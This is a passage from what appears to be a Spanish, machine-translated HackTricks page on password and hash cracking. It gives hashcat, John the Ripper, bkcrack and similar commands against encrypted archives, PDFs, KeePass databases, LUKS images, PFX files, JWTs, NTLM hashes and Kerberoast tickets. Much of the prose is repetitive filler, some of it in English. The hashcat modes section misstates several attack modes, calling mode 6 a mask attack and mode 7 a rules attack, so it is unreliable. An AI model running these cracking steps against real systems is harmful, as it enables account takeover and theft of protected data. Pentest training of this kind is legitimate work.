#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Ataque de fuerza bruta con texto plano conocido en archivos zip

Necesitas conocer el **texto plano** (o parte del texto plano) **de un archivo contenido dentro** del zip encriptado. Puedes verificar los **nombres de archivo y el tamaño de los archivos contenidos dentro** de un zip encriptado ejecutando: **`7z l encrypted.zip`**\
Descarga [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) desde la página de lanzamientos.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

El formato de archivo 7z es un formato de compresión de archivos de código abierto que ofrece una alta relación de compresión. Es ampliamente utilizado para comprimir y descomprimir archivos en sistemas operativos Windows.

#### Ataque de fuerza bruta

El ataque de fuerza bruta es una técnica utilizada para descifrar contraseñas o claves de cifrado probando todas las combinaciones posibles hasta encontrar la correcta. En el contexto de archivos 7z, un ataque de fuerza bruta se puede utilizar para intentar descifrar un archivo protegido con contraseña.

#### Herramientas de fuerza bruta

Existen varias herramientas disponibles para realizar ataques de fuerza bruta en archivos 7z. Algunas de las herramientas más populares incluyen:

- **John the Ripper**: una herramienta de cracking de contraseñas que admite varios formatos de archivo, incluido 7z.
- **Hashcat**: una herramienta de recuperación de contraseñas que también es compatible con el formato de archivo 7z.
- **Hydra**: una herramienta de cracking de contraseñas en red que puede utilizarse para realizar ataques de fuerza bruta en servicios que utilizan autenticación basada en contraseña.

#### Consideraciones de seguridad

Es importante tener en cuenta que los ataques de fuerza bruta pueden llevar mucho tiempo y recursos computacionales, especialmente si la contraseña es larga y compleja. Además, estos ataques pueden ser detectados por sistemas de seguridad y bloqueados.

Por lo tanto, es recomendable utilizar contraseñas seguras y complejas para proteger los archivos 7z y evitar ataques de fuerza bruta exitosos. Además, es importante mantener las herramientas y sistemas actualizados para evitar vulnerabilidades conocidas que podrían ser explotadas por atacantes.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
# Fuerza bruta

La fuerza bruta es una técnica de hacking que implica probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. Es un enfoque simple pero efectivo para obtener acceso no autorizado a sistemas protegidos por contraseña.

La fuerza bruta se basa en la premisa de que, dado el tiempo suficiente, se puede probar cada posible combinación de caracteres hasta encontrar la contraseña correcta. Esto se logra utilizando programas automatizados que generan y prueban contraseñas en rápida sucesión.

Existen diferentes métodos y herramientas disponibles para llevar a cabo ataques de fuerza bruta. Algunas de las herramientas más populares incluyen Hydra, Medusa y John the Ripper. Estas herramientas permiten a los hackers automatizar el proceso de generación y prueba de contraseñas, lo que acelera significativamente el tiempo necesario para encontrar una contraseña válida.

Es importante tener en cuenta que la fuerza bruta puede ser un proceso lento y consumir muchos recursos computacionales. Además, muchos sistemas implementan medidas de seguridad para detectar y bloquear ataques de fuerza bruta, como bloquear una cuenta después de un número determinado de intentos fallidos.

A pesar de estas limitaciones, la fuerza bruta sigue siendo una técnica popular entre los hackers debido a su simplicidad y efectividad. Es por eso que es crucial que los usuarios utilicen contraseñas seguras y complejas para proteger sus cuentas y sistemas.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Contraseña del propietario de PDF

Para descifrar una contraseña del propietario de PDF, consulta esto: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Descifrado de NTLM

El descifrado de NTLM es una técnica utilizada para obtener contraseñas mediante la fuerza bruta. NTLM (NT LAN Manager) es un protocolo de autenticación utilizado en sistemas operativos Windows. 

La fuerza bruta es un método en el que se prueban todas las combinaciones posibles de contraseñas hasta encontrar la correcta. En el caso del descifrado de NTLM, se generan hashes de contraseñas y se comparan con el hash objetivo para encontrar una coincidencia.

Existen varias herramientas y recursos disponibles para llevar a cabo el descifrado de NTLM. Algunas de las herramientas más populares incluyen John the Ripper, Hashcat y oclHashcat. Estas herramientas utilizan técnicas avanzadas de procesamiento de hashes para acelerar el proceso de descifrado.

Es importante tener en cuenta que el descifrado de NTLM es una actividad ilegal sin el consentimiento del propietario del sistema. Solo se debe realizar como parte de una evaluación de seguridad autorizada, como una prueba de penetración.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass es un gestor de contraseñas de código abierto que te permite almacenar y gestionar de forma segura tus contraseñas. Utiliza una base de datos encriptada para almacenar tus contraseñas y otros datos confidenciales. Keepass utiliza un algoritmo de cifrado fuerte para proteger tus contraseñas y ofrece funciones adicionales como la generación automática de contraseñas seguras.

Una técnica común utilizada para intentar acceder a una base de datos de Keepass es el ataque de fuerza bruta. En este tipo de ataque, un hacker intenta adivinar la contraseña correcta probando diferentes combinaciones de caracteres hasta encontrar la correcta. Esto puede llevar mucho tiempo y requiere de una gran cantidad de recursos computacionales.

Para proteger tu base de datos de Keepass contra ataques de fuerza bruta, es importante elegir una contraseña segura y compleja. Una contraseña segura debe tener una combinación de letras mayúsculas y minúsculas, números y caracteres especiales. Además, es recomendable utilizar una contraseña larga para aumentar la seguridad.

Otra medida de seguridad importante es habilitar la función de bloqueo después de un número determinado de intentos fallidos de inicio de sesión. Esto evitará que un atacante continúe intentando adivinar la contraseña después de un cierto número de intentos.

Además, es recomendable mantener tu base de datos de Keepass actualizada con las últimas actualizaciones de seguridad. Estas actualizaciones suelen incluir parches para vulnerabilidades conocidas y mejoras en la seguridad del software.

Recuerda que la seguridad de tus contraseñas depende en gran medida de ti. Utiliza Keepass de manera responsable y sigue buenas prácticas de seguridad, como no compartir tus contraseñas con nadie y cambiarlas regularmente.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting es una técnica de ataque que se utiliza para obtener contraseñas débiles de cuentas de servicio en un dominio de Active Directory. Esta técnica se basa en la debilidad de las contraseñas de servicio que se almacenan en el dominio en forma de hashes de Kerberos.

El proceso de keberoasting comienza identificando las cuentas de servicio en el dominio. Estas cuentas de servicio suelen ser utilizadas por aplicaciones y servicios para autenticarse en el dominio. Una vez identificadas, se extraen los hashes de Kerberos asociados a estas cuentas.

Luego, se utiliza una herramienta como "Rubeus" para solicitar un ticket de servicio para cada cuenta de servicio identificada. Estos tickets de servicio contienen los hashes de Kerberos necesarios para realizar el ataque de keberoasting.

Una vez obtenidos los tickets de servicio, se extraen los hashes de Kerberos y se utilizan herramientas como "John the Ripper" o "Hashcat" para realizar un ataque de fuerza bruta y descifrar las contraseñas débiles.

Es importante destacar que keberoasting solo funciona con contraseñas débiles, ya que las contraseñas fuertes son más difíciles de descifrar mediante ataques de fuerza bruta. Por lo tanto, es fundamental utilizar contraseñas seguras y robustas para evitar este tipo de ataques.

En resumen, keberoasting es una técnica de ataque que aprovecha las contraseñas débiles de las cuentas de servicio en un dominio de Active Directory. Mediante el uso de herramientas de descifrado y ataques de fuerza bruta, los hackers pueden obtener acceso no autorizado a estas cuentas y comprometer la seguridad del sistema.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Imagen de Lucks

#### Método 1

Instalar: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Método 2

Brute force is a common method used in hacking to gain unauthorized access to a system or account. It involves systematically trying all possible combinations of passwords until the correct one is found.

To perform a brute force attack, hackers use automated tools that can generate and test thousands or even millions of password combinations per second. These tools often rely on dictionaries of commonly used passwords or employ algorithms to generate variations of words, numbers, and symbols.

Brute force attacks can be time-consuming and resource-intensive, especially if the target system has implemented security measures such as account lockouts or CAPTCHA. However, they can still be effective against weak or easily guessable passwords.

To protect against brute force attacks, it is important to use strong, unique passwords that are not easily guessable. Additionally, implementing measures such as account lockouts, CAPTCHA, and rate limiting can help mitigate the risk of a successful brute force attack.

In conclusion, brute force attacks are a common and potentially effective method used by hackers to gain unauthorized access to systems or accounts. By understanding how these attacks work and implementing appropriate security measures, individuals and organizations can better protect themselves against this type of threat.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Otro tutorial de BF de Luks: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Clave privada PGP/GPG

A PGP/GPG private key is a crucial component in the encryption and decryption process. It is used to securely encrypt messages and files, ensuring that only the intended recipient can access the information.

The private key should be kept confidential and protected at all times. If an attacker gains access to your private key, they can decrypt your encrypted messages and gain unauthorized access to your sensitive information.

To generate a PGP/GPG private key, you can use various tools and software available. It is important to choose a strong passphrase for your private key to enhance its security. Additionally, regularly backing up your private key is recommended to prevent data loss.

Remember to never share your private key with anyone and keep it stored in a secure location.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Utiliza [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) y luego john

### Columna protegida por contraseña en Open Office

Si tienes un archivo xlsx con una columna protegida por contraseña, puedes desprotegerla:

* **Cárgalo en Google Drive** y la contraseña se eliminará automáticamente
* Para **eliminarla** **manualmente**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Certificados PFX

Los certificados PFX son archivos que contienen tanto la clave privada como el certificado público. Estos archivos se utilizan comúnmente en entornos de seguridad para autenticación y cifrado. Los certificados PFX se pueden utilizar en una variedad de aplicaciones, como servidores web, clientes de correo electrónico y VPN.

### Ataques de fuerza bruta

Un ataque de fuerza bruta es un método utilizado por los hackers para descifrar contraseñas o claves de cifrado mediante la prueba de todas las combinaciones posibles hasta encontrar la correcta. Este tipo de ataque puede ser muy efectivo, pero también puede llevar mucho tiempo, especialmente si la contraseña es larga y compleja.

Existen varias herramientas y recursos disponibles para llevar a cabo ataques de fuerza bruta, como programas de software especializados y diccionarios de contraseñas. Estas herramientas pueden automatizar el proceso de prueba de todas las combinaciones posibles, lo que acelera el tiempo necesario para descifrar una contraseña.

Es importante tener en cuenta que los ataques de fuerza bruta son ilegales y están estrictamente prohibidos sin el consentimiento explícito del propietario del sistema o la red. Solo se deben realizar ataques de fuerza bruta como parte de una evaluación de seguridad autorizada, como una prueba de penetración.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias más avanzadas del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Herramientas

**Ejemplos de hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Identificador de hash
```bash
hash-identifier
> <HASH>
```
### Listas de palabras

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Contraseñas**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Herramientas de generación de listas de palabras**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generador avanzado de secuencias de teclado con caracteres base, mapa de teclado y rutas configurables.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mutación de John

Lee _**/etc/john/john.conf**_ y configúralo.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Ataques de Hashcat

* **Ataque de lista de palabras** (`-a 0`) con reglas

**Hashcat** ya viene con una **carpeta que contiene reglas** pero puedes encontrar [**otras reglas interesantes aquí**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Ataque de combinación de listas de palabras**

Es posible **combinar 2 listas de palabras en 1** con hashcat.\
Si la lista 1 contiene la palabra **"hello"** y la segunda contiene 2 líneas con las palabras **"world"** y **"earth"**. Se generarán las palabras `helloworld` y `helloearth`.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Ataque de máscara** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Ataque de Wordlist + Máscara (`-a 6`) / Máscara + Wordlist (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Modos de Hashcat

Hashcat es una herramienta de cracking de contraseñas que admite varios modos de ataque. Estos modos determinan cómo se procesan y se prueban las contraseñas. A continuación se presentan los modos de Hashcat más comunes:

- **Modo de ataque de diccionario (modo 0):** Este modo utiliza un archivo de diccionario que contiene una lista de palabras o combinaciones de palabras para probar como contraseñas. Hashcat probará cada entrada del diccionario hasta encontrar una coincidencia.

- **Modo de ataque de fuerza bruta (modo 3):** En este modo, Hashcat probará todas las combinaciones posibles de caracteres para encontrar la contraseña correcta. Este modo es extremadamente lento y generalmente se utiliza como último recurso cuando otros métodos de ataque no tienen éxito.

- **Modo de ataque de máscara (modo 6):** En este modo, se especifica una máscara que define el patrón de la contraseña. Hashcat generará todas las combinaciones posibles de caracteres que se ajusten a la máscara especificada.

- **Modo de ataque de reglas (modo 7):** Este modo utiliza reglas predefinidas o personalizadas para modificar las contraseñas del diccionario antes de probarlas. Estas reglas pueden incluir cambios en la capitalización, la adición de números o símbolos, entre otros.

- **Modo de ataque de combinación (modo 1):** En este modo, Hashcat combina palabras de un archivo de diccionario para formar contraseñas. Puede especificar el número de palabras que se combinarán y el orden en que se combinarán.

- **Modo de ataque de ataque híbrido (modo 6):** Este modo combina el ataque de diccionario con el ataque de fuerza bruta. Hashcat probará primero todas las entradas del diccionario y luego realizará un ataque de fuerza bruta en las contraseñas que no se encontraron en el diccionario.

Estos son solo algunos de los modos de ataque que ofrece Hashcat. Cada modo tiene sus propias ventajas y desventajas, y la elección del modo dependerá del escenario de hacking y de las características de la contraseña que se está intentando crackear.
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Descifrando Hashes de Linux - archivo /etc/shadow

El archivo `/etc/shadow` en sistemas Linux almacena las contraseñas de los usuarios en forma de hashes. Estos hashes son generados utilizando algoritmos criptográficos como MD5, SHA-256, etc. En este capítulo, exploraremos una técnica comúnmente utilizada para descifrar estos hashes: el ataque de fuerza bruta.

## ¿Qué es un ataque de fuerza bruta?

Un ataque de fuerza bruta es un método utilizado para descifrar contraseñas probando todas las combinaciones posibles hasta encontrar la correcta. En el contexto de descifrar hashes de contraseñas, esto implica generar hashes para todas las posibles contraseñas y compararlos con el hash objetivo.

## Herramientas para realizar un ataque de fuerza bruta

Existen varias herramientas disponibles para realizar ataques de fuerza bruta en hashes de Linux. Algunas de las herramientas más populares son:

- **John the Ripper**: una herramienta de descifrado de contraseñas que admite una amplia gama de algoritmos de hash.
- **Hashcat**: una herramienta de descifrado de contraseñas que utiliza la potencia de procesamiento de la GPU para acelerar el proceso de descifrado.
- **Hydra**: una herramienta de fuerza bruta en línea que puede utilizarse para descifrar contraseñas en servicios remotos como SSH, FTP, etc.

## Consideraciones antes de realizar un ataque de fuerza bruta

Antes de realizar un ataque de fuerza bruta, es importante tener en cuenta algunas consideraciones:

- **Legalidad**: Realizar un ataque de fuerza bruta sin el consentimiento explícito del propietario del sistema es ilegal. Siempre asegúrese de obtener permiso antes de realizar cualquier tipo de ataque.
- **Recursos**: Los ataques de fuerza bruta pueden ser intensivos en recursos y llevar mucho tiempo. Asegúrese de tener suficiente potencia de procesamiento y tiempo disponible antes de comenzar.
- **Diccionarios**: Utilizar diccionarios de contraseñas puede aumentar las posibilidades de éxito en un ataque de fuerza bruta. Estos diccionarios contienen palabras comunes, combinaciones de teclado, nombres, etc.

## Realizando un ataque de fuerza bruta

Una vez que haya obtenido permiso y esté preparado, puede realizar un ataque de fuerza bruta utilizando una de las herramientas mencionadas anteriormente. Estas herramientas le permitirán especificar el archivo `/etc/shadow` como objetivo y utilizar diferentes diccionarios y configuraciones para el ataque.

Recuerde que los ataques de fuerza bruta pueden llevar mucho tiempo, especialmente si la contraseña objetivo es compleja. Sin embargo, con suficiente tiempo y recursos, es posible descifrar hashes de contraseñas y obtener acceso no autorizado a un sistema.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Fuerza bruta

La fuerza bruta es una técnica comúnmente utilizada para descifrar contraseñas en sistemas Windows. Consiste en probar todas las combinaciones posibles de caracteres hasta encontrar la contraseña correcta. Aunque es un método lento y consume muchos recursos, puede ser efectivo si se utiliza correctamente.

## Herramientas de fuerza bruta

Existen varias herramientas de fuerza bruta disponibles que pueden ayudar en el proceso de descifrado de contraseñas de Windows. Algunas de las herramientas más populares incluyen:

- **John the Ripper**: una herramienta de descifrado de contraseñas que admite una amplia gama de algoritmos de hash utilizados en Windows.
- **Hashcat**: una herramienta de descifrado de contraseñas de alto rendimiento que utiliza la potencia de procesamiento de la GPU para acelerar el proceso de fuerza bruta.
- **Cain & Abel**: una herramienta de recuperación de contraseñas que también incluye capacidades de fuerza bruta.

## Ataques de fuerza bruta

Existen diferentes tipos de ataques de fuerza bruta que se pueden utilizar para descifrar contraseñas de Windows. Algunos de los ataques más comunes incluyen:

- **Ataque de diccionario**: este tipo de ataque utiliza una lista predefinida de palabras o combinaciones de palabras para probar como contraseñas.
- **Ataque de fuerza bruta pura**: en este tipo de ataque, se prueban todas las combinaciones posibles de caracteres hasta encontrar la contraseña correcta.
- **Ataque de fuerza bruta híbrida**: este tipo de ataque combina un ataque de diccionario con un ataque de fuerza bruta pura, lo que permite probar una amplia gama de combinaciones posibles.

## Consideraciones de seguridad

Es importante tener en cuenta que el uso de la fuerza bruta para descifrar contraseñas es una actividad ilegal sin el consentimiento del propietario del sistema. Además, este método puede ser detectado por sistemas de seguridad y bloqueado. Por lo tanto, se recomienda utilizar estas técnicas solo con fines legales y éticos, como parte de una evaluación de seguridad autorizada o una prueba de penetración.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Fuerza bruta

La fuerza bruta es una técnica comúnmente utilizada para descifrar contraseñas mediante la prueba exhaustiva de todas las combinaciones posibles. En el contexto de las aplicaciones, esto implica el uso de fuerza bruta para descifrar hashes de contraseñas almacenados.

## ¿Qué es un hash?

Un hash es una función matemática que toma una entrada y la convierte en una cadena de caracteres alfanuméricos de longitud fija. En el caso de las contraseñas, los hashes se utilizan para almacenar una versión encriptada de la contraseña en lugar de almacenar la contraseña en sí misma. Esto proporciona una capa adicional de seguridad, ya que los hashes son difíciles de revertir para obtener la contraseña original.

## Ataque de fuerza bruta a hashes

El ataque de fuerza bruta a hashes implica probar todas las combinaciones posibles de contraseñas hasta encontrar una que coincida con el hash almacenado. Esto se logra mediante el uso de programas o scripts automatizados que generan y prueban contraseñas en rápida sucesión.

## Herramientas y recursos

Existen varias herramientas y recursos disponibles para llevar a cabo ataques de fuerza bruta a hashes. Algunas de las herramientas más populares incluyen:

- **John the Ripper**: una herramienta de cracking de contraseñas que admite una amplia variedad de algoritmos de hash.
- **Hashcat**: una herramienta de cracking de contraseñas que utiliza la potencia de procesamiento de las tarjetas gráficas para acelerar el proceso de descifrado.
- **CrackStation**: un sitio web que ofrece una base de datos de hashes de contraseñas comunes y permite buscar hashes para encontrar la contraseña original.

Además de estas herramientas, también existen bases de datos de hashes de contraseñas filtradas que se pueden utilizar para realizar ataques de fuerza bruta. Estas bases de datos contienen hashes de contraseñas que se han filtrado en violaciones de datos y pueden ser útiles para probar la seguridad de las contraseñas en una organización.

## Consideraciones éticas y legales

Es importante tener en cuenta que el uso de fuerza bruta para descifrar contraseñas sin el consentimiento del propietario es ilegal y éticamente cuestionable. Solo se debe realizar un ataque de fuerza bruta a hashes con el permiso explícito del propietario del sistema o en el contexto de una prueba de penetración autorizada.

Además, es importante tener en cuenta que los ataques de fuerza bruta pueden ser ineficientes y llevar mucho tiempo, especialmente si las contraseñas son largas y complejas. Por lo tanto, es recomendable utilizar otras técnicas de hacking y seguridad de contraseñas, como el uso de contraseñas seguras y la implementación de políticas de cambio de contraseñas regulares.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
